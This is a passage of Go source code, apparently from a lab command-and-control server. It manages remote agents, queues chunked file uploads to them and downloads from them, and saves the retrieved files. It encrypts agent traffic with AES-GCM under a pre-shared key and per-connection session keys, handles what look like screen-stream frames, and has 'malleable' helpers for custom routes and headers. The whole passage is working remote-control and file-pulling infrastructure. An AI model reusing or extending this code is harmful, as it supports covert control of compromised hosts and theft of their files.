		LocalPath string `json:"local_path"` // server-side file under DATA_DIR/files or absolute lab path
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad json", 400)
		return
	}
	if req.AgentID == "" || req.Path == "" {
		http.Error(w, "agent_id and path required", 400)
		return
	}
	var raw []byte
	var err error
	if req.DataB64 != "" {
		raw, err = base64.StdEncoding.DecodeString(req.DataB64)
		if err != nil {
			http.Error(w, "bad data_b64", 400)
			return
		}
	} else if req.LocalPath != "" {
		if filepath.IsAbs(req.LocalPath) {
			http.Error(w, "absolute local_path not allowed (must be a name under DATA_DIR/files)", 400)
			return
		}
		p := filepath.Join(cfg.DataDir, "files", filepath.Base(req.LocalPath))
		raw, err = os.ReadFile(p)
		if err != nil {
			http.Error(w, "read local: "+err.Error(), 400)
			return
		}
	} else {
		http.Error(w, "data_b64 or local_path required", 400)
		return
	}
	if len(raw) > cfg.FileMaxBytes {
		http.Error(w, fmt.Sprintf("file too large: %d > %d", len(raw), cfg.FileMaxBytes), 400)
		return
	}
	sum := sha256.Sum256(raw)
	sha := hex.EncodeToString(sum[:])
	transferID := newID("xfer")
	chunkSize := cfg.FileChunkBytes
	if chunkSize > len(raw) && len(raw) > 0 {
		chunkSize = len(raw)
	}
	if chunkSize <= 0 {
		chunkSize = len(raw)
	}
	var chunkCount int
	if len(raw) == 0 {
		chunkCount = 1
	} else {
		chunkCount = (len(raw) + chunkSize - 1) / chunkSize
	}
	cmdIDs := make([]string, 0, chunkCount)
	for i := 0; i < chunkCount; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(raw) {
			end = len(raw)
		}
		var part []byte
		if len(raw) == 0 {
			part = []byte{}
		} else {
			part = raw[start:end]
		}
		payloadObj := map[string]interface{}{
			"path":        req.Path,
			"transfer_id": transferID,
			"chunk_index": i,
			"chunk_count": chunkCount,
			"total_size":  len(raw),
			"offset":      start,
			"sha256":      sha,
			"chunk_b64":   base64.StdEncoding.EncodeToString(part),
		}
		pb, _ := json.Marshal(payloadObj)
		job, status, err := enqueueAndMaybeSend(req.AgentID, "upload", string(pb), "")
		if err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		cmdIDs = append(cmdIDs, job.ID+"/"+status)
	}
	writeJSON(w, 200, map[string]interface{}{
		"status":      "enqueued",
		"transfer_id": transferID,
		"agent_id":    req.AgentID,
		"path":        req.Path,
		"size":        len(raw),
		"sha256":      sha,
		"chunk_count": chunkCount,
		"command_ids": cmdIDs,
	})
}

// POST /admin/download {agent_id, path} -> enqueues download job; poll /admin/jobs or /admin/file?command_id=
func handleAdminDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	var req struct {
		AgentID string `json:"agent_id"`
		Path    string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad json", 400)
		return
	}
	if req.AgentID == "" || req.Path == "" {
		http.Error(w, "agent_id and path required", 400)
		return
	}
	payloadObj := map[string]interface{}{
		"path":      req.Path,
		"max_bytes": cfg.FileMaxBytes,
	}
	pb, _ := json.Marshal(payloadObj)
	job, status, err := enqueueAndMaybeSend(req.AgentID, "download", string(pb), "")
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
	writeJSON(w, 200, map[string]interface{}{
		"status":     status,
		"command_id": job.ID,
		"agent_id":   req.AgentID,
		"path":       req.Path,
	})
}

// GET /admin/file?command_id=  — returns decoded download result saved under data/files if present, or job result JSON
func handleAdminFileGet(w http.ResponseWriter, r *http.Request) {
	cmdID := r.URL.Query().Get("command_id")
	if cmdID == "" {
		http.Error(w, "command_id required", 400)
		return
	}
	jobsMu.RLock()
	j, ok := jobs[cmdID]
	jobsMu.RUnlock()
	if !ok {
		http.Error(w, "not found", 404)
		return
	}
	if j.Status != "done" && j.Status != "failed" {
		writeJSON(w, 200, map[string]interface{}{
			"status": j.Status, "command_id": cmdID, "ready": false,
		})
		return
	}
	// try parse result as download JSON
	var meta map[string]interface{}
	if err := json.Unmarshal([]byte(j.Result), &meta); err == nil {
		if b64, ok := meta["data_b64"].(string); ok && b64 != "" {
			raw, err := base64.StdEncoding.DecodeString(b64)
			if err == nil {
				// save copy
				name := cmdID + ".bin"
				if p, ok := meta["path"].(string); ok && p != "" {
					name = cmdID + "_" + filepath.Base(p)
				}
				outPath := filepath.Join(cfg.DataDir, "files", name)
				_ = os.WriteFile(outPath, raw, 0o644)
				meta["saved_path"] = outPath
				meta["ready"] = true
				meta["status"] = j.Status
				meta["command_id"] = cmdID
				// omit huge b64 if ?save_only=1
				if r.URL.Query().Get("omit_b64") == "1" {
					delete(meta, "data_b64")
				}
				writeJSON(w, 200, meta)
				return
			}
		}
	}
	writeJSON(w, 200, map[string]interface{}{
		"status":     j.Status,
		"command_id": cmdID,
		"ready":      j.Status == "done",
		"result":     j.Result,
		"error":      j.Error,
		"success":    j.Success,
	})
}

// ---------- persistence ----------

func statePath() string {
	return filepath.Join(cfg.DataDir, "state.json")
}

func schedulePersist() {
	if !cfg.PersistState {
		return
	}
	select {
	case persistCh <- struct{}{}:
	default:
	}
}

func persistLoop() {
	for range persistCh {
		time.Sleep(200 * time.Millisecond) // debounce
		saveState()
	}
}

func saveState() {
	stateMu.Lock()
	defer stateMu.Unlock()

	ps := persistentState{SavedAt: time.Now().UTC()}
	agentsMu.RLock()
	for _, a := range agents {
		ps.Agents = append(ps.Agents, persistAgent{
			ID: a.ID, StableID: a.StableID, Hostname: a.Hostname, Username: a.Username,
			OS: a.OS, Arch: a.Arch, PID: a.PID, Version: a.Version, Transport: a.Transport,
			FirstSeen: a.FirstSeen, LastSeen: a.LastSeen,
		})
	}
	agentsMu.RUnlock()

	now := time.Now().UTC()
	jobsMu.Lock()
	for id, j := range jobs {
		// drop old terminal
		if (j.Status == "done" || j.Status == "failed" || j.Status == "cancelled") &&
			cfg.JobTTL > 0 && now.Sub(j.UpdatedAt) > cfg.JobTTL {
			delete(jobs, id)
			continue
		}
		// on disk, sent -> queued so reconnect redelivers
		cp := *j
		if cp.Status == "sent" {
			cp.Status = "queued"
		}
		ps.Jobs = append(ps.Jobs, &cp)
	}
	jobsMu.Unlock()

	b, err := json.MarshalIndent(ps, "", "  ")
	if err != nil {
		return
	}
	tmp := statePath() + ".tmp"
	if err := os.WriteFile(tmp, b, 0o600); err != nil {
		return
	}
	_ = os.Rename(tmp, statePath())
}

func loadState() {
	b, err := os.ReadFile(statePath())
	if err != nil {
		return
	}
	var ps persistentState
	if err := json.Unmarshal(b, &ps); err != nil {
		logPrintf("state load: %v", err)
		return
	}
	agentsMu.Lock()
	for _, pa := range ps.Agents {
		agents[pa.ID] = &Agent{
			ID: pa.ID, StableID: pa.StableID, Hostname: pa.Hostname, Username: pa.Username,
			OS: pa.OS, Arch: pa.Arch, PID: pa.PID, Version: pa.Version, Transport: pa.Transport,
			FirstSeen: pa.FirstSeen, LastSeen: pa.LastSeen, Online: false,
		}
	}
	agentsMu.Unlock()
	jobsMu.Lock()
	for _, j := range ps.Jobs {
		if j == nil || j.ID == "" {
			continue
		}
		if j.Status == "sent" {
			j.Status = "queued"
		}
		jobs[j.ID] = j
	}
	jobsMu.Unlock()
	logPrintf("loaded state: agents=%d jobs=%d", len(ps.Agents), len(ps.Jobs))
}

// ---------- helpers ----------

func newID(prefix string) string {
	var b [8]byte
	_, _ = crand.Read(b[:])
	return fmt.Sprintf("%s-%s", prefix, hex.EncodeToString(b[:]))
}

func asString(v interface{}) string {
	switch t := v.(type) {
	case string:
		return t
	case fmt.Stringer:
		return t.String()
	case float64:
		return strconv.FormatInt(int64(t), 10)
	default:
		return ""
	}
}

func asInt(v interface{}) int {
	switch t := v.(type) {
	case float64:
		return int(t)
	case int:
		return t
	case string:
		n, _ := strconv.Atoi(t)
		return n
	default:
		return 0
	}
}

// ---------- B-H7 malleable helpers ----------

func parseCSVPaths(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	var out []string
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if !strings.HasPrefix(p, "/") {
			p = "/" + p
		}
		out = append(out, p)
	}
	return out
}

// parseCSVHosts parses a comma-separated list of host[:port] origin tokens
// for websocket Origin checks. Unlike parseCSVPaths it must NOT prepend "/"
// — origins are hostnames, not routes.
func parseCSVHosts(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	var out []string
	for _, p := range strings.Split(s, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		out = append(out, p)
	}
	return out
}

func containsPath(list []string, p string) bool {
	for _, x := range list {
		if x == p {
			return true
		}
	}
	return false
}

func uniquePaths(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, p := range in {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			continue
		}
		seen[p] = true
		out = append(out, p)
	}
	return out
}

// parseHeaderKV: "K: V; K2: V2" or "K=V;K2=V2"
func parseHeaderKV(s string) map[string]string {
	out := map[string]string{}
	s = strings.TrimSpace(s)
	if s == "" {
		return out
	}
	parts := strings.Split(s, ";")
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		var k, v string
		if i := strings.Index(p, ":"); i >= 0 {
			k, v = strings.TrimSpace(p[:i]), strings.TrimSpace(p[i+1:])
		} else if i := strings.Index(p, "="); i >= 0 {
			k, v = strings.TrimSpace(p[:i]), strings.TrimSpace(p[i+1:])
		} else {
			continue
		}
		if k != "" {
			out[k] = v
		}
	}
	return out
}

func applyResponseHeaders(w http.ResponseWriter) {
	for k, v := range cfg.ResponseHeaders {
		if k != "" {
			w.Header().Set(k, v)
		}
	}
}

// ---------- B-H8 app-level AEAD (AES-256-GCM + PSK) ----------

func derivePSKKey(psk string) []byte {
	sum := sha256.Sum256([]byte("c2-lab-v1|" + psk))
	return sum[:]
}

type encEnvelope struct {
	V   int    `json:"v"`
	Alg string `json:"alg"`
	N   string `json:"n"`  // b64 nonce
	CT  string `json:"ct"` // b64 ciphertext+tag
}

func aeadSeal(key []byte, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return nil, err
	}
	ct := gcm.Seal(nil, nonce, plain, nil)
	env := encEnvelope{
		V: 1, Alg: "aes-256-gcm",
		N:  base64.StdEncoding.EncodeToString(nonce),
		CT: base64.StdEncoding.EncodeToString(ct),
	}
	return json.Marshal(env)
}

func aeadOpen(key []byte, raw []byte) ([]byte, error) {
	var env encEnvelope
	if err := json.Unmarshal(raw, &env); err != nil {
		return nil, err
	}
	if env.V != 1 || env.CT == "" || env.N == "" {
		return nil, fmt.Errorf("not an enc envelope")
	}
	nonce, err := base64.StdEncoding.DecodeString(env.N)
	if err != nil {
		return nil, err
	}
	ct, err := base64.StdEncoding.DecodeString(env.CT)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, ct, nil)
}

// binStreamMagic marks a binary stream frame on the agent WS. Wire format:
//
//	0xB1 || nonce(12) || AES-256-GCM(sessionKey).Seal(frame)
//
// This replaces the legacy text path's base64 + double-JSON + sha256
// inflation (~1.86x per segment) for H264 stream traffic.
const binStreamMagic = 0xB1

// aeadSealRaw is aeadSeal without the JSON/base64 envelope: nonce || ct+tag.
func aeadSealRaw(key []byte, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return nil, err
	}
	return append(nonce, gcm.Seal(nil, nonce, plain, nil)...), nil
}

// aeadOpenRaw reverses aeadSealRaw.
func aeadOpenRaw(key []byte, raw []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(raw) < ns+1 {
		return nil, fmt.Errorf("short raw aead frame")
	}
	return gcm.Open(nil, raw[:ns], raw[ns:], nil)
}

func looksEncrypted(raw []byte) bool {
	var peek map[string]interface{}
	if json.Unmarshal(raw, &peek) != nil {
		return false
	}
	if _, ok := peek["ct"]; !ok {
		return false
	}
	if _, ok := peek["n"]; !ok {
		return false
	}
	return true
}

// connKeys maps a live WebSocket connection to its ECDH session key. The key
// is set during the register handshake and used for every message after the
// register reply (the reply itself is still PSK-sealed because the agent cannot
// know the session key until it reads the reply).
var (
	connKeysMu sync.Mutex
	connKeys   = map[*websocket.Conn][]byte{}
)

func setConnKey(c *websocket.Conn, k []byte) {
	if c == nil {
		return
	}
	connKeysMu.Lock()
	defer connKeysMu.Unlock()
	if k == nil {
		delete(connKeys, c)
	} else {
		connKeys[c] = k
	}
}

func getConnKey(c *websocket.Conn) []byte {
	if c == nil {
		return nil
	}
	connKeysMu.Lock()
	defer connKeysMu.Unlock()
	return connKeys[c]
}

func decodeAgentBody(raw []byte) (map[string]interface{}, error) {
	return decodeAgentBodyKey(cfg.CryptoKey, raw)
}

func decodeAgentBodyKey(key []byte, raw []byte) (map[string]interface{}, error) {
	raw = bytesTrimSpace(raw)
	if cfg.CryptoOn {
		if !looksEncrypted(raw) {
			// allow plaintext register only if crypto optional? require enc when on
			return nil, fmt.Errorf("crypto required")
		}
		pt, err := aeadOpen(key, raw)
		if err != nil {
			return nil, err
		}
		var msg map[string]interface{}
		if err := json.Unmarshal(pt, &msg); err != nil {
			return nil, err
		}
		return msg, nil
	}
	// crypto off: plain JSON; if envelope arrives, try open with empty fail -> plain
	if looksEncrypted(raw) && len(key) > 0 {
		pt, err := aeadOpen(key, raw)
		if err == nil {
			var msg map[string]interface{}
			if err := json.Unmarshal(pt, &msg); err == nil {
				return msg, nil
			}
		}
	}
	var msg map[string]interface{}
	if err := json.Unmarshal(raw, &msg); err != nil {
		return nil, err
	}
	return msg, nil
}

func encodeAgentBody(v interface{}) ([]byte, error) {
	return encodeAgentBodyKey(cfg.CryptoKey, v)
}

func encodeAgentBodyKey(key []byte, v interface{}) ([]byte, error) {
	plain, err := json.Marshal(v)
	if err != nil {
		return nil, err
	}
	if cfg.CryptoOn {
		return aeadSeal(key, plain)
	}
	return plain, nil
}

func writeAgentJSON(w http.ResponseWriter, code int, v interface{}) {
	b, err := encodeAgentBody(v)
	if err != nil {
		http.Error(w, "encode", 500)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_, _ = w.Write(b)
	if len(b) == 0 || b[len(b)-1] != '\n' {
		_, _ = w.Write([]byte("\n"))
	}
}

func wsWriteMsg(conn *websocket.Conn, v interface{}) error {
	if conn == nil {
		return fmt.Errorf("nil conn")
	}
	key := getConnKey(conn)
	if key == nil {
		key = cfg.CryptoKey
	}
	b, err := encodeAgentBodyKey(key, v)
	if err != nil {
		return err
	}
	// Write deadline keeps a stalled peer from holding the agent mutex forever.
	_ = conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	return conn.WriteMessage(websocket.TextMessage, b)
}

func wsReadMsg(conn *websocket.Conn, dst *map[string]interface{}) error {
	_, raw, err := conn.ReadMessage()
	if err != nil {
		return err
	}
	key := getConnKey(conn)
	if key == nil {
		key = cfg.CryptoKey
	}
	msg, err := decodeAgentBodyKey(key, raw)
	if err != nil {
		return err
	}
	*dst = msg
	return nil
}

func bytesTrimSpace(b []byte) []byte {
	return []byte(strings.TrimSpace(string(b)))
}

